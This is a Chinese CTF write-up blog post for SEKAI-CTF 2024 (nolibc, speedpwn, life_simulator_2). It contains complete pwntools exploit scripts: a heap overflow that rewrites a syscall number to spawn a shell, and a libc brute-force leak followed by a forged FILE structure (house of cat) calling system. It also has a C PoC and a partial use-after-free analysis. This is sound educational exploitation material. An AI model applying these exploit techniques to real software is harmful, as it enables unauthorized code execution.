@@ -1,0 +1,1039 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024 SEKAI-CTF (nolibc speedpwn life_simulator_2) · Y0uYuGe</title>
+<meta name="description" content="最后可以对一个 worker 实现 UAF，然后直接改 fd 就行。或者找两个相邻的 worker，都写进 tcache_struct，把第一个申请出来，利用 size 越界写把仍在 tcache_struct 中的相邻 worker 的 fd 改成加密后的栈地址。里面指向的 Worker 对象并没有被释放，而 Worker 对象中包含一个。但麻烦的是只有字符串长度为 0x47 时才会分配 0x50 的 chunk，0x48 就不行，所以 company 的低字节也不行——不过只需要 7 个字节，因为堆地址只有 6 个字节。呼。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20SEKAI-CTF%20(nolibc%20speedpwn%20life_simulator_2)" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024">2024 年</a></nav>
+    <h1>2024 SEKAI-CTF (nolibc speedpwn life_simulator_2)</h1>
+    <div class="meta"><time>2024-09-01</time><span class="tag">#PWN</span><span class="tag">#CTF</span></div>
+    <article class="post-body">
+<h1 id="nolibc">nolibc</h1>
+<pre><code class="language-bash">[!] Did not find any GOT entries
+[*] &#39;/home/llk/Desktop/pwn/sekaictf/nolibc/main&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<p>看了下保护，感觉是溢出；只能注册一个账号并用这个账号登录。
+<del>可以通过数据段中残留的 PIE 地址泄露 PIE</del> <del>后来 Nightu 师傅说可以直接读文件——感觉自己好蠢</del> </p>
+<p><del>后来 tplus 师傅利用了 size 是缓冲区长度而不是整个 chunk 长度这一点，可以溢出修改系统调用号。我当时其实也想到了，但那时源码没逆清楚；后来好好逆了一遍，确实有一个非常明显的 bug</del> </p>
+<pre><code class="language-c">char *__fastcall alloc(int size)
+{
+  struct chunk *next_use_chunk; // [rsp+4h] [rbp-20h]
+  signed int up_align_16_size; // [rsp+10h] [rbp-14h]
+  struct chunk *v4; // [rsp+14h] [rbp-10h]
+  struct chunk *v5; // [rsp+1Ch] [rbp-8h]
+
+  if ( !size )
+    return 0LL;
+  up_align_16_size = (size + 15) &amp; 0xFFFFFFF0;
+  v5 = next_use_chunk_ptr;
+  v4 = 0LL;
+  while ( 1 )
+  {
+    if ( !v5 )
+      return 0LL;
+    if ( up_align_16_size &lt;= v5-&gt;size )
+      break;
+    v4 = v5;
+    v5 = v5-&gt;next_use_chunk;
+  }
+  if ( v5-&gt;size &gt;= (unsigned __int64)(up_align_16_size + 16LL) )
+  {
+    next_use_chunk = (struct chunk *)&amp;v5-&gt;buff[up_align_16_size];
+    next_use_chunk-&gt;size = v5-&gt;size - up_align_16_size - 16;
+    next_use_chunk-&gt;next_use_chunk = v5-&gt;next_use_chunk;
+    v5-&gt;next_use_chunk = next_use_chunk;
+    v5-&gt;size = up_align_16_size;
+  }
+  if ( v4 )
+    v4-&gt;next_use_chunk = v5-&gt;next_use_chunk;
+  else
+    next_use_chunk_ptr = v5-&gt;next_use_chunk;
+  return v5-&gt;buff;
+}
+</code></pre>
+<p>首先从 <code>next_use_chunk</code> 开始查找 size 大于等于 <code>up_align_16_size </code> 的 use_chunk_ptr。如果找到的 use_chunk_ptr 就是当前最初的 next_use_chunk_ptr（第一个可以使用的 chunk），就直接更新 <code>   next_use_chunk_ptr = v5-&gt;next_use_chunk;</code>。同时根据 <code>v5-&gt;size &gt;= (unsigned __int64)(up_align_16_size + 16LL)</code>——即 size 是否大于等于当前 chunk 的总长度（大于等于意味着切分后至少还剩下 0x10 的部分可以作为 chunk_header）——来决定是否切分。如果 size 只满足大于等于 <code>up_align_16_size </code>，就通过 <code> next_use_chunk_ptr = v5-&gt;next_use_chunk;</code> 迭代（不能切分，说明当前 chunk 恰好够用）</p>
+<p>由于最后一个 next_use_chunk 的 size 是剩余长度而不是 buff 长度，而比较时一般都是和缓冲区长度比较，于是剩余长度就被当成了缓冲区长度。当剩余长度为 0x10 时，此时申请 0x20 就会溢出 0x10 字节。</p>
+<p>注意分配的大小是输入的 <code>len+0x10&amp; 0xFFFFFFF0</code>，而输入内容的长度是 <code>len+1</code>，所以输入内容只能填到溢出的那一个字节——但这可以通过 <code>len=0x xxxf</code> 来避免</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+
+p=process(&quot;./main&quot;)
+
+context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+p.sendlineafter(b&quot;Choose an option: &quot;,str(2))
+p.sendlineafter(b&quot;Username: &quot;,b&quot;llk&quot;) 
+p.sendlineafter(b&quot;Password: &quot;,b&quot;1010&quot;) 
+
+p.sendlineafter(b&quot;Choose an option: &quot;,str(1))
+p.sendlineafter(b&quot;Username: &quot;,b&quot;llk&quot;) 
+p.sendlineafter(b&quot;Password: &quot;,b&quot;1010&quot;) 
+
+
+def add(length,content):
+    p.sendlineafter(b&quot;Choose an option: &quot;,str(1))
+    p.sendlineafter(b&quot;Enter string length: &quot;,str(length)) 
+    p.sendlineafter(b&quot;Enter a string: &quot;,content) 
+
+
+def dele(index):
+    p.sendlineafter(b&quot;Choose an option:&quot;,str(2))
+    p.sendlineafter(b&quot;Enter the index of the string to delete: &quot;,str(index)) 
+  
+
+
+def show():
+    p.sendlineafter(b&quot;Choose an option:&quot;,str(3))
+
+
+def save(filename):
+    p.sendlineafter(b&quot;Choose an option:&quot;,str(4))
+    p.sendlineafter(b&quot;Enter the filename: &quot;,filename) 
+
+
+def load(filename):
+    p.sendlineafter(b&quot;Choose an option:&quot;,str(5))
+    p.sendlineafter(b&quot;Enter the filename: &quot;,filename) 
+
+# load(&quot;/proc/self/maps&quot;)
+# show()
+# leak=p.recv(timeout=2)
+# print(&quot;[+] leak------------------------&quot;)
+
+
+
+for i in range(191):
+    add((int(&quot;0xe0&quot;, 16)),&quot;llk&quot;)
+
+# gdb.attach(p)
+
+add((int(&quot;0x7f&quot;, 16)),0x70*b&quot;a&quot;+p32(0)+p32(1)+p32(59)+p32(3))
+
+
+# pause()
+
+for i in range(191):
+    dele(i)
+
+# pause()
+load(b&quot;/bin/sh\x00&quot;)
+
+
+p.interactive()
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20SEKAI-CTF%20(nolibc%20speedpwn%20life_simulator_2)/assets/csdn-141507613/image-001-6e8646ad8f.png" alt="图片"></p>
+<h1 id="speedpwn">speedpwn</h1>
+<pre><code class="language-bash">[*] &#39;/home/llk/Desktop/pwn/sekaictf/speedpwn/chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>记得 .gdbinit 中需要 <code>set disable-randomization off</code></p>
+<pre><code class="language-c">unsigned long long game_history;
+unsigned long long seed;
+FILE *seed_generator;
+……
+ if(cmp(player_num, bot_num)) {
+        puts(&quot;You win!&quot;);
+        *((unsigned long long*)&amp;game_history + (number_of_games / 64)) |= ((unsigned long long)1 &lt;&lt; (number_of_games % 64));
+    }
+    else {
+        puts(&quot;Bot wins!&quot;);
+        *((unsigned long long*)&amp;game_history + (number_of_games / 64)) &amp;= (~((unsigned long long)1 &lt;&lt; (number_of_games % 64)));
+    }
+</code></pre>
+<p>明显的 game_history 溢出，可以对 bss 中更高的地址进行任意写。发送全 1 可以把 game_history 对应的位置 1，发送 0 可以把 game_history 对应的位置 0。</p>
+<p>溢出修改 seed_generator 的文件结构体——但是没有地址泄露。我想从栈上的残留泄露 libc，却发现变量都会被输入赋值。<del>问了 eurus 师傅，说通过 scanf 输入 - 不会改变残留的 libc，于是就能泄露 libc。没想到 scanf 输入 - 会让残留的 libc 保持不变——我还是太菜了</del> </p>
+<p>这应该是调用 libc 函数时在栈帧上留下的 libc 地址，然后通过 simulate 中的 cmp 进行爆破；每次 simulate 留下的栈帧都是一样的。</p>
+<p>爆破利用的是残留 libc 的低 20 位和最高 4 位保持不变这一点（这是我在 ubuntu22.04 上运行看到的，其他师傅的 wp 好像说是低 12 位——不过爆破原理是一样的）。
+libc 的最低位是 0，所以从低到高填 1 位；当长度相等时，返回的是 0 而不是 1，由此得到 1 的位数。</p>
+<ul>
+<li>长度：libc 的最低位是 0，所以从低到高填 1 位；当长度相等时，返回的是 0 而不是 1，由此得到 1 的位数。</li>
+<li>位：爆破中间的 24 位，从低到高把位置 1；爆破规则如下：</li>
+</ul>
+<pre><code class="language-c">  libc_midd_24    player_midd_24
+    ……            ……
+    0             0
+    1             0 
+    0             0
+    0             0
+    0/1           1    -&gt;   为1相等往高位遍历时由于不相等然后&amp;后一定返回1，为0不相等则返回0    
+</code></pre>
+<p>本想覆盖 GOT，但没有能控制参数的函数，而且 seed_generator 只能改一次。于是想通过 IO 劫持控制流然后 getshell。由于不能直接修改 seed_generator 的文件结构体，我利用 bss 上的越界写伪造了一个文件结构体，然后打 IO。</p>
+<p>IO 的 house of cat PoC：</p>
+<pre><code class="language-c">#include &lt;stddef.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+size_t getlibc()
+{
+    puts(&quot;getlibc&quot;);
+    size_t result=&amp;puts-0x75b30;
+    return result;
+}
+unsigned long long seed;
+FILE *seed_generator;
+size_t fake_io[0x100];
+int main()
+{   
+     setvbuf(stdout, NULL, _IONBF, 0);
+    size_t libc_base=getlibc();
+    printf(&quot;libc base %p&quot;,libc_base);
+    
+    seed_generator = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;);
+    fread((char*)&amp;seed, 1, 8, seed_generator);
+
+
+    fake_io[0]=0x3b687320;  //will cover  content that lock point with 1
+    fake_io[0x20/8]=0;  //write_base
+    fake_io[0x28/8]=1;  //write_ptr
+    fake_io[0xa0/8]=fake_io;   //_wide_data  
+    fake_io[0x18/8]=0;         //_wide_data-&gt;_IO_write_base
+    fake_io[0x30/8]=0;     //_wide_data-&gt;_IO_buf_base
+    fake_io[0xe0/8]=fake_io;    // _wide_data-&gt;__wide_vtable 0xe0
+    fake_io[0x68/8]=libc_base+0x4e720;  //system  
+    fake_io[0x88/8]=fake_io+0x100/8;  // attention fake_io is long*  , lock  address can be write    [fake_io+8]==0         
+    fake_io[0xc0/8]=0;  //mode
+    fake_io[0xd8/8]=libc_base+0x1d2648-40; //_IO_wfile_jumps-40
+
+    seed_generator=fake_io;
+
+
+    fread((char*)&amp;seed, 1, 8, seed_generator);
+
+   
+
+    
+
+
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20SEKAI-CTF%20(nolibc%20speedpwn%20life_simulator_2)/assets/csdn-141507613/image-002-dd64bf9ac4.png" alt="图片"></p>
+<h2 id="exp-1">exp</h2>
+<pre><code class="language-python">from pwn import *
+
+p=process(&quot;./chall&quot;)
+
+def set_1():
+    p.sendlineafter(b&quot;&gt; &quot;,str(&quot;f&quot;))
+    p.sendlineafter(b&quot;Player plays: &quot;,str(18446744073709551615))
+
+def set_0():
+    p.sendlineafter(b&quot;&gt; &quot;,str(&quot;f&quot;))
+    p.sendlineafter(b&quot;Player plays: &quot;,str(0))
+
+def simulate(bot,play):
+    p.sendlineafter(b&quot;&gt; &quot;,str(&quot;s&quot;))
+    p.sendlineafter(b&quot;Bot number: &quot;,str(bot))
+    p.sendlineafter(b&quot;Player number: &quot;,str(play))
+
+
+libc=0x7000000955c2
+leak_1bit_number_libc=0x7000000955c2+1
+num=1
+
+for i in range(48,64):
+    tmp=leak_1bit_number_libc
+    tmp=tmp|1&lt;&lt;i 
+
+    simulate(&quot;-&quot;,tmp)
+    result=p.recvuntil(b&quot;!&quot;)
+    if b&quot;Bot win!&quot; in result:
+        num=num+1
+        leak_1bit_number_libc=leak_1bit_number_libc|1&lt;&lt;i 
+    if b&quot;You win!&quot; in result:
+        num=num+1
+        leak_1bit_number_libc=(leak_1bit_number_libc-1)|1&lt;&lt;i |1&lt;&lt;(i+1) 
+        print(&quot;1bit_num&quot;,num)
+        break
+    
+
+
+use_num=0
+libc=leak_1bit_number_libc
+
+max_num=num
+
+for i in range(20,44): 
+
+    if use_num==max_num-1:
+        tmp=libc
+        tmp=tmp&amp;~(1&lt;&lt;44)
+        print(&quot;&amp; libc&quot;,hex(tmp))
+        tmp=tmp|1&lt;&lt;i 
+        print(&quot;try libc&quot;,hex(tmp))
+
+        simulate(&quot;-&quot;,tmp)
+        result=p.recvuntil(b&quot;!&quot;)
+        
+        if b&quot;Bot win!&quot; in result:
+            print(&quot;leak finish&quot;)
+            libc=tmp|(1&lt;&lt;44)
+            libc=libc&amp;~(1&lt;&lt;(use_num+48)) 
+    
+            break
+        continue
+    tmp=libc
+    tmp=tmp&amp;~(1&lt;&lt;(use_num+48)) 
+    print(&quot;&amp; libc&quot;,hex(tmp))
+    tmp=tmp|1&lt;&lt;i 
+    print(&quot;try libc&quot;,hex(tmp))
+    simulate(&quot;-&quot;,tmp)
+    result=p.recvuntil(b&quot;!&quot;)
+   
+    if b&quot;Bot win!&quot; in result:
+        print(&quot;success libc bit&quot;,hex(tmp))
+        libc=tmp
+        use_num=use_num+1
+    
+libc_base=libc-0x955c2
+     
+
+def write_64(content):
+    for i in range(64):
+        
+        if content &amp; (1&lt;&lt;i)!=0:
+            set_1()
+            
+        else:
+            set_0()
+            
+           
+
+
+
+
+
+write_64(0)
+write_64(0)
+write_64(0x4040a0)
+
+# fake_io[0]=0x3b687320;  #will cover  content that lock point with 1
+# fake_io[0x20/8]=0;  #write_base
+# fake_io[0x28/8]=1;  #write_ptr
+# fake_io[0xa0/8]=0x4040a0;   #_wide_data  
+# fake_io[0x18/8]=0;         #_wide_data-&gt;_IO_write_base
+# fake_io[0x30/8]=0;     #_wide_data-&gt;_IO_buf_base
+# fake_io[0xe0/8]=0x4040a0;    # _wide_data-&gt;__wide_vtable 0xe0
+# fake_io[0x68/8]=libc_base+0x58740;  #system  
+# fake_io[0x88/8]=0x4040a0+0x100;  # attention fake_io is long*  , lock  address can be write    [fake_io+8]==0         
+# fake_io[0xc0/8]=0;  #mode
+# fake_io[0xd8/8]=libc_base+0x202228-40; #_IO_wfile_jumps-40
+
+
+
+
+payload=flat({0:p32(0x3b687320),0x28:p64(1),0x30:p64(0),0x68:p64(libc_base+0x58740),0x88:p64(0x4040a0+0x100),0xa0:p64(0x4040a0),0xc0:0,0xd8:p64(libc_base+0x202228-40),0xe0:p64(0x4040a0)},filler=b&#39;\x00&#39;, length=0x100)
+
+# gdb.attach(p)
+
+# context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+while payload:
+    tmp=payload[:8]
+    print(u64(tmp))
+    write_64(u64(tmp))
+    payload=payload[8:]
+
+
+p.sendlineafter(b&quot;&gt; &quot;,str(&quot;r&quot;))
+p.interactive()
+
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20SEKAI-CTF%20(nolibc%20speedpwn%20life_simulator_2)/assets/csdn-141507613/image-003-92c20b2936.png" alt="图片"></p>
+<h1 id="life_simulator_2">life_simulator_2</h1>
+<h2 id="委托构造函数">委托构造函数</h2>
+<p>委托构造函数是 C++11 引入的特性，允许一个构造函数调用同一个类的另一个构造函数。这一特性可以减少代码重复，提高代码的可维护性和可读性。借助委托构造函数，我们可以在一个构造函数中对对象进行标准化的初始化，然后在其他构造函数中复用这段初始化逻辑。</p>
+<h3 id="委托构造函数的语法">委托构造函数的语法</h3>
+<p>基本语法是通过初始化列表调用另一个构造函数。例如：</p>
+<pre><code class="language-cpp">class Example {
+public:
+    // 主构造函数
+    Example(int a, int b, int c) {
+        // 初始化逻辑
+        x = a;
+        y = b;
+        z = c;
+    }
+
+    // 委托构造函数，调用主构造函数
+    Example(int a, int b) : Example(a, b, 0) {}
+
+    // 委托构造函数，调用主构造函数
+    Example(int a) : Example(a, 0, 0) {}
+
+    // 委托构造函数，调用主构造函数
+    Example() : Example(0, 0, 0) {}
+
+private:
+    int x, y, z;
+};
+</code></pre>
+<h3 id="解释">解释</h3>
+<ol>
+<li><p><strong><code>Example(int a, int b, int c)</code></strong></p>
+<ul>
+<li>这是主构造函数，负责初始化 <code>x</code>、<code>y</code>、<code>z</code> 三个成员变量。</li>
+</ul>
+</li>
+<li><p><strong><code>Example(int a, int b) : Example(a, b, 0) {}</code></strong></p>
+<ul>
+<li>这是一个委托构造函数，它调用主构造函数 <code>Example(int a, int b, int c)</code>，并把第三个参数 <code>c</code> 默认设为 <code>0</code>。</li>
+<li>这样就避免了在构造函数中重复编写初始化逻辑。</li>
+</ul>
+</li>
+<li><p><strong><code>Example(int a) : Example(a, 0, 0) {}</code></strong></p>
+<ul>
+<li>这个构造函数进一步简化：只需要一个参数 <code>a</code>，另外两个参数设为 <code>0</code>，同样委托给主构造函数。</li>
+</ul>
+</li>
+<li><p><strong><code>Example() : Example(0, 0, 0) {}</code></strong></p>
+<ul>
+<li>无参构造函数，所有参数都设为默认值 <code>0</code>。</li>
+</ul>
+</li>
+</ol>
+<h2 id="stdremove-和-stderase">std:remove 和 std:erase</h2>
+<p>这段代码从 <code>std::vector&lt;Company*&gt; companies</code> 中移除一个特定的 <code>Company*</code> 指针。下面来看看这段代码是如何工作的以及其背后的原理：</p>
+<h3 id="代码解释">代码解释</h3>
+<pre><code class="language-cpp">companies.erase(std::remove(companies.begin(), companies.end(), company_to_remove), companies.end());
+</code></pre>
+<ol>
+<li><p><strong><code>std::remove</code> 函数</strong></p>
+<ul>
+<li><strong>作用</strong>：<code>std::remove</code> 是 C++ 标准库中的一个算法，它重新排列区间 <code>[first, last)</code> 中的元素，把所有不等于 <code>value</code> 的元素移到前面，并返回一个指向“移除”操作之后新末尾的迭代器。</li>
+<li><strong>参数</strong>：<ul>
+<li><code>companies.begin()</code>：指向 vector 开头的迭代器。</li>
+<li><code>companies.end()</code>：指向 vector 末尾的迭代器。</li>
+<li><code>company_to_remove</code>：需要从 vector 中移除的特定 <code>Company*</code> 指针。</li>
+</ul>
+</li>
+<li><strong>结果</strong>：<code>std::remove</code> 并不会真正删除元素，它只是把不需要的元素移到后面，并返回指向新末尾的迭代器。</li>
+</ul>
+</li>
+<li><p><strong><code>companies.erase</code> 函数</strong></p>
+<ul>
+<li><strong>作用</strong>：<code>erase</code> 是 <code>std::vector</code> 的成员函数，真正从 vector 中删除指定区间内的元素。</li>
+<li><strong>参数</strong>：<ul>
+<li>第一个参数是 <code>std::remove</code> 返回的指向新末尾的迭代器。</li>
+<li>第二个参数是 <code>companies.end()</code>，指向 vector 真正的末尾。</li>
+</ul>
+</li>
+<li><strong>结果</strong>：<code>erase</code> 从 vector 中删除从 <code>std::remove</code> 返回的迭代器到 vector 末尾之间的所有元素。</li>
+</ul>
+</li>
+</ol>
+<h3 id="原理">原理</h3>
+<ul>
+<li><p><strong>&quot;remove-erase&quot; 惯用法</strong>：这段代码使用了 C++ 中的 &quot;remove-erase&quot; 惯用法，这是从 STL 容器中删除元素的常见模式。因为 <code>std::remove</code> 只重新排列元素而不改变容器的大小，所以需要 <code>erase</code> 来真正删除那些多余的元素。</p>
+</li>
+<li><p><strong>效率</strong>：这种方法很高效，因为它只遍历容器一次，用 <code>std::remove</code> 移动元素，避免了在循环中多次调用 <code>erase</code> 带来的低效。</p>
+</li>
+</ul>
+<h3 id="内存管理注意事项">内存管理注意事项</h3>
+<ul>
+<li><p><strong>删除指针</strong>：使用 <code>std::vector&lt;Company*&gt;</code> 时，<code>erase</code> 只删除指针本身，并不会释放指针所指向的堆内存。如果 <code>Company*</code> 指针是用 <code>new</code> 分配的，程序员必须确保在移除之前或之后用 <code>delete</code> 释放这些内存，以避免内存泄漏。例如：</p>
+<pre><code class="language-cpp">auto it = std::remove(companies.begin(), companies.end(), company_to_remove);
+for (auto iter = it; iter != companies.end(); ++iter) {
+    delete *iter; // 释放堆内存
+}
+companies.erase(it, companies.end());
+</code></pre>
+</li>
+</ul>
+<h2 id="思路">思路</h2>
+<p>保护全开。</p>
+<p><del>从题目描述来看，好像是从 worker 入手——没用</del> </p>
+<p><del>只发现了一个整数溢出，感觉没什么用；同时注意到 clear 不太正常，因为它没有 free，只是清零</del> 
+问了 nightu 师傅才知道是逻辑问题——我是真没注意到……感觉好久没有注意过这种逻辑漏洞了。</p>
+<p>整数溢出其实还是有用的。以后要注意溢出后的结果对程序执行流的影响——可能会有意想不到的惊喜。同时，以后也要把代码逻辑理清楚。</p>
+<p>在受整数溢出影响的值中，可能影响程序控制流的是 <code>company_budget</code>：它会影响 total_net_worth，使其也发生越界。但越界后的 total_net_worth 在其他执行流中似乎仍能被正常理解（逻辑上是正常的）。那么，越界的 <code>company_budget</code> 唯一可能影响程序执行流的地方就是这里——不过这个发现的逻辑相当离谱。</p>
+<pre><code class="language-c">void Company::elapse_week() {
+    uint64_t total_profit = 0;
+    for(auto it : this-&gt;projects) {
+        total_profit += it-&gt;generate_profit() - it-&gt;worker_pay();
+    }
+    this-&gt;company_budget += total_profit;
+    this-&gt;company_age += 1;
+    
+   if(!(company_to_remove-&gt;number_of_workers() == 0 || company_to_remove-&gt;get_company_budget() == 0)) {
+        std::cerr &lt;&lt; &quot;ERR: Not Allowed&quot; &lt;&lt; std::endl;
+        return;
+    }
+</code></pre>
+<p>等价于：</p>
+<pre><code class="language-c">company_to_remove-&gt;number_of_workers() != 0 &amp;&amp; company_to_remove-&gt;get_company_budget() != 0
+</code></pre>
+<p>这与正常逻辑相反——似乎是故意这么写，让你去尝试把它们设为 0，思考为零的影响：两者至少有一个为 0 才能卖掉。</p>
+<p>然后就进入这里：company_to_remove 被释放后进入 0x50 的 tcache。<del>本以为可以再申请出来然后泄露堆地址，但每个相关的堆分配实例都会覆盖前八个字节……放弃</del> </p>
+<pre><code class="language-c">company_to_remove-&gt;remove_projects();
+    delete company_to_remove;
+
+void Company::remove_projects() {
+    for(auto it : this-&gt;projects) {
+        delete it;
+    }
+    this-&gt;projects.clear();
+}
+Company::~Company() { 
+    this-&gt;company_name.clear();
+    this-&gt;projects.clear();
+    this-&gt;company_budget = 0;
+}
+Project::~Project() { 
+    this-&gt;project_name.clear();
+    this-&gt;workers.clear();
+    this-&gt;company = nullptr;
+    this-&gt;profit_per_week = 0;
+}
+</code></pre>
+<p>我发现这里的释放并不完整：只释放了 projects 对象（0x48 也进入 0x50 的 tcache），但 project 里的 <code>std::vector&lt;Worker*&gt; workers {};</code>——它指向的 Worker 对象并没有被释放。而 Worker 对象中包含 <code> Project *project;</code>，但 project 已经被释放了，所以我们可以通过 workers 得到一个 UAF。</p>
+<p>于是选择让 generate_profit() 为零、worker_pay() 等于 company_budget 的思路，使 company_budget 最终变为零。</p>
+<p>在 generate_profit() 中，profit_per_week 在这里不能为零。一开始我想看看两者的乘积有没有可能溢出，在转换成 uint64_t 后变成零。</p>
+<p>当 <code>double</code> 和 <code>uint64_t</code> 相乘、结果再转换为 <code>uint64_t</code> 时，如果结果超出 <code>uint64_t</code> 能表示的范围，就可能发生溢出。在某些情况下，溢出后的结果可能会被转换为 <code>0</code>。</p>
+<h3 id="1-背景">1. 背景</h3>
+<p><code>uint64_t</code> 是 64 位无符号整数，其范围是 <code>[0, 2^64 - 1]</code>，即 <code>[0, 18446744073709551615]</code>。当 <code>double</code> 的乘积超出这个范围时，把它转换为 <code>uint64_t</code> 就会发生溢出。</p>
+<p>在 C/C++ 中，把浮点数转换为无符号整数类型时，如果浮点数超出目标类型的可表示范围，行为是未定义的。具体行为可能因编译器和运行环境而异。在某些系统上，溢出后的结果可能被当作 <code>0</code>。</p>
+<h3 id="2-示例代码">2. 示例代码</h3>
+<p>下面是演示这种情况的示例：</p>
+<pre><code class="language-cpp">#include &lt;iostream&gt;
+#include &lt;cstdint&gt;
+#include &lt;limits&gt; // For std::numeric_limits
+
+int main() {
+    uint64_t a = 18446744073709551615ULL; // uint64_t的最大值
+    double b = 2.0; // 将使结果超过uint64_t最大值
+
+    double result_double = a * b; // 先计算乘积，结果为double
+    uint64_t result_uint64 = static_cast&lt;uint64_t&gt;(result_double); // 转换为uint64_t
+
+    std::cout &lt;&lt; &quot;Double result: &quot; &lt;&lt; result_double &lt;&lt; std::endl;
+    std::cout &lt;&lt; &quot;Converted to uint64_t: &quot; &lt;&lt; result_uint64 &lt;&lt; std::endl;
+
+    return 0;
+}
+</code></pre>
+<h3 id="3-解释">3. 解释</h3>
+<p>在这个例子中：</p>
+<ul>
+<li><code>a</code> 是 <code>uint64_t</code> 类型的最大值 <code>18446744073709551615</code>。</li>
+<li><code>b</code> 是 <code>double</code> 值 <code>2.0</code>。</li>
+</ul>
+<p><code>a</code> 和 <code>b</code> 相乘的结果是 <code>36893488147419103230</code>（即 <code>2 * 18446744073709551615</code>），远远超出了 <code>uint64_t</code> 类型的最大值。</p>
+<p>把 <code>result_double</code> 转换为 <code>uint64_t</code> 时，由于结果超出了 <code>uint64_t</code> 的可表示范围，行为是未定义的。在某些编译器或运行环境下，溢出后的结果可能被当作 <code>0</code>。</p>
+<pre><code class="language-cpp">Double result: 3.68935e+19
+Converted to uint64_t: 0
+</code></pre>
+<p>那么只要让 <code>number_of_workers</code> 和 <code>profit_per_week</code> 尽可能大就行了。</p>
+<p>或者看看 <code>std::pow((long double)PROFIT_RATIO, this-&gt;number_of_workers())</code> 有没有可能为零——但它不太可能为零。</p>
+<pre><code class="language-c">uint64_t Project::generate_profit() {
+    return this-&gt;profit_per_week * std::pow((long double)PROFIT_RATIO, this-&gt;number_of_workers());
+    //果 PROFIT_RATIO 是 1.1，number_of_workers() 返回 3，那么这个表达式就会计算 1.1³。
+}
+</code></pre>
+<p>UAF 之后，连续申请 company 占据原来的对象，然后为该 company 申请一个 project，让 vector 部分被正常填好。否则把这个 company 当作对象使用时，<code>Company* Project::get_company() </code> 会返回 0，而之后的代码会对 <code>get_company</code> 返回的 company 进行访问操作。然后打算用 workers_info 泄露地址。</p>
+<p>一开始感觉泄露不了，占位也感觉有问题，因为对应的 <code>Company 位置并不是 Company 对象，按 Company 访问可能会出错——主要是 get_company_name 和 number_of_projects</code>，而且那个位置也没有恰好与输入内容匹配的残留数据。但我还是决定试一试，调试时发现了 <code>Project workers count: 11941248770158</code>。结合对应的函数和当时的布局：</p>
+<pre><code class="language-c">__int64 __fastcall std::vector&lt;Worker *&gt;::size(_QWORD *a1)
+{
+  return (__int64)(a1[1] - *a1) &gt;&gt; 3;
+}
+
+company占据project
+pwndbg&gt; tele 0x56e24f210390 12
+00:0000│ rax 0x56e24f210390 —▸ 0x56e24f2103a0 ◂— 0x7375727565 /* &#39;eurus&#39; */
+01:0008│     0x56e24f210398 ◂— 5
+02:0010│     0x56e24f2103a0 ◂— 0x7375727565 /* &#39;eurus&#39; */
+03:0018│     0x56e24f2103a8 ◂— 0
+04:0020│     0x56e24f2103b0 ◂— 0x3f2
+05:0028│     0x56e24f2103b8 ◂— 0
+06:0030│     0x56e24f2103c0 —▸ 0x56e24f210370 —▸ 0x56e24f210650 —▸ 0x56e24f210660 ◂— 0x56e2006e7770 /* &#39;pwn&#39; */
+07:0038│     0x56e24f2103c8 —▸ 0x56e24f210378 ◂— 0
+08:0040│     0x56e24f2103d0 —▸ 0x56e24f210378 ◂— 0
+</code></pre>
+<p>意外地发现 <code>a1[1] 是 0x56e24f210370 </code>，而 <code>*a1 是 0</code>，再 <code>&gt;&gt;3</code>——所以此时 <code>11941248770158 就是右移 3 位的结果</code>。</p>
+<p>此时通过 <code>Company* Project::get_company()</code> 得到的 <code>Company</code> 如下：</p>
+<pre><code class="language-bash">pwndbg&gt; tele 0x56e24f210378 12
+00:0000│  0x56e24f210378 ◂— 0      #  std::string company_name {&quot;&quot;};
+01:0008│  0x56e24f210380 ◂— 0
+02:0010│  0x56e24f210388 ◂— 0x51 /* &#39;Q&#39; */
+03:0018│  0x56e24f210390 —▸ 0x56e24f2103a0 ◂— 0x7375727565 /* &#39;eurus&#39; */
+04:0020│  0x56e24f210398 ◂— 5    #company_budget
+05:0028│  0x56e24f2103a0 ◂— 0x7375727565 /* &#39;eurus&#39; */   #    uint64_t company_age {0};
+06:0030│  0x56e24f2103a8 ◂— 0  # std::vector&lt;Project*&gt; projects {};
+07:0038│  0x56e24f2103b0 ◂— 0x3f2
+08:0040│  0x56e24f2103b8 ◂— 0
+09:0048│  0x56e24f2103c0 —▸ 0x56e24f210370 —▸ 0x56e24f210650 —▸ 0x56e24f210660 ◂— 0x56e2006e7770 /* &#39;pwn&#39; */
+0a:0050│  0x56e24f2103c8 —▸ 0x56e24f210378 ◂— 0
+0b:0058│  0x56e24f2103d0 —▸ 0x56e24f210378 ◂— 0
+</code></pre>
+<p>然后感觉一切都应该围绕 worker 展开，因为其他操作都是正常操作：<code>hire_worker 对可 UAF 的 worker 的相关操作似乎没有影响；fire_worker 用不了，因为对应的对象被 company 占据，vector 不完整；move_worker 同样因为不完整而无法成功</code>……</p>
